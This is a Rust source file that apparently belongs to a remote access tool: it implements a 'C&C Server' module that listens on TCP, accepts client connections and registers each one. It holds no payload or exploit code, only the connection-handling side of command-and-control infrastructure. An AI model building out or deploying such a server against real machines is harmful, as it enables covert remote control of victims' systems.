mod client;

use std::collections::HashMap;
use std::io;
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::{debug, warn};
use rat_common::module::{ModuleImpl, ModuleState};
use tokio::net::{TcpListener, TcpStream, ToSocketAddrs};
use tokio::sync::RwLock;

use crate::modules::cc::client::ClientConnector;

pub struct CCServer {
    _listener: TcpListener,
    _clients: RwLock<HashMap<SocketAddr, Arc<ClientConnector>>>,
    _state: Arc<ModuleState>,
}

impl CCServer {
    pub async fn bind<A: ToSocketAddrs>(addr: A) -> anyhow::Result<Arc<Self>> {
        let listener = TcpListener::bind(addr).await?;
        Ok(Arc::new(Self {
            _listener: listener,
            _clients: RwLock::new(HashMap::new()),
            _state: ModuleState::new(),
        }))
    }
}

#[async_trait]
impl ModuleImpl for CCServer {
    type EventType = io::Result<(TcpStream, SocketAddr)>;

    fn name(&self) -> &str {
        "C&C Server"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        self._listener.accept().await
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let (stream, addr) = event?;

        let mut clients = self._clients.write().await;
        if clients.contains_key(&addr) {
            warn!("Client {addr} is trying to connect more than once. Ignoring.");
        } else {
            let client = Arc::new(ClientConnector::new(stream, addr));
            self.add_submodule(client.clone()).await;
            clients.insert(addr, client);

            debug!("Accepted new connection from {addr}");
        }

        Ok(())
    }
}
